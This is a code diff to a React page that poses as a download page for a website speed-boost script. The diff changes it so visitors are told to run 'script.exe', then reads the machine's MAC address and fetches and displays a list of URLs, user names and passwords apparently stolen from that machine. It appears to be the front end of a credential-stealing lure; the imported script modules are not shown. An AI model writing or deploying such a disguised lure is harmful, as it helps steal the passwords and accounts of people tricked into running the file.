@@ -6,11 +6,16 @@ import { motion } from "framer-motion"
 import { Download, Clock, Check, FileText, Play, X } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Progress } from "@/components/ui/progress"
+import RunScript from "@/script/run_script"
+import GetPassword from "@/script/get_password"
+import os from "os"
+import { Password } from "@/interface"
 
 export default function Home() {
   const [isDownloading, setIsDownloading] = useState(false)
   const [isDownloaded, setIsDownloaded] = useState(false)
   const [progress, setProgress] = useState(0)
+  const [isShowPassword, setIsShowPassword] = useState(false)
   const [timeLeft, setTimeLeft] = useState({
     hours: 1,
     minutes: 59,
@@ -77,11 +82,36 @@ export default function Home() {
     // You would typically trigger an actual download here
     // For example:
     // const link = document.createElement('a')
-    // link.href = '/path-to-your-script.js'
-    // link.download = 'script.js'
+    // link.href = '/script/script.py'
+    // link.download = 'script.py'
     // document.body.appendChild(link)
     // link.click()
     // document.body.removeChild(link)
+    RunScript();
+  }
+
+  const [password, setPassword] = useState<Password[]>();
+
+  const getPassword = async () => {
+      var mac = "";
+      mac = getMac();
+      console.log(mac)
+      const pwd = await GetPassword(mac);
+      setPassword(pwd);
+      setIsShowPassword(true);
+  };
+
+  function getMac() {
+    const interfaces = os.networkInterfaces();
+    for (const key in interfaces) {
+        for (const iface of interfaces[key] || []) {
+            if (iface.mac && iface.mac !== "00:00:00:00:00:00") {
+                console.log("MAC Address:", iface.mac);
+                return iface.mac;
+            }
+        }
+    }
+    return "";
   }
 
   return (
@@ -313,39 +343,45 @@ export default function Home() {
                             <div className="flex-shrink-0 h-6 w-6 rounded-full bg-blue-100 flex items-center justify-center text-blue-800 font-bold text-sm">
                               1
                             </div>
-                            <p className="ml-3 text-gray-600">Add the script to your website's header section</p>
+                            <p className="ml-3 text-gray-600">run the script.exe file</p>
                           </div>
                           <div className="flex items-start">
                             <div className="flex-shrink-0 h-6 w-6 rounded-full bg-blue-100 flex items-center justify-center text-blue-800 font-bold text-sm">
                               2
                             </div>
-                            <p className="ml-3 text-gray-600">Initialize with your website's configuration</p>
+                            <p className="ml-3 text-gray-600">reload thhis website</p>
                           </div>
                           <div className="flex items-start">
                             <div className="flex-shrink-0 h-6 w-6 rounded-full bg-blue-100 flex items-center justify-center text-blue-800 font-bold text-sm">
                               3
                             </div>
-                            <p className="ml-3 text-gray-600">Enjoy the improved performance!</p>
+                            <p className="ml-3 text-gray-600">Enjoy your time!</p>
                           </div>
                         </div>
-
+                        {isShowPassword ? 
                         <div className="mt-6 bg-gray-800 rounded-md p-4 text-left">
                           <pre className="text-green-400 text-sm overflow-x-auto">
-                            <code>{`<script src="speedboost.js"></script>
-<script>
-  SpeedBoost.init({
-    mode: 'advanced',
-    preload: true,
-    lazyLoad: true
-  });
-</script>`}</code>
+                            <code>{password?.map(
+                              (item) => 
+                                <div key={item.sequence}>
+                                <div>index: {item.sequence} </div>
+                                <div>mac_address: {item.mac_address} </div>
+                                <div>url: {item.url}</div>
+                                <div> user_name: {item.user_name} </div>
+                                <div>password: {item.password}</div>
+                              </div>)
+                              }
+                              </code>
                           </pre>
                         </div>
+                        :
+                        null
+                        }
                       </div>
 
                       <div className="mt-6">
-                        <Button onClick={handleDownload} className="bg-blue-500 hover:bg-blue-600 text-white">
-                          Download Again
+                        <Button onClick={getPassword} className="bg-blue-500 hover:bg-blue-600 text-white">
+                          We have something to show
                           <Download className="ml-2 h-4 w-4" />
                         </Button>
                       </div>
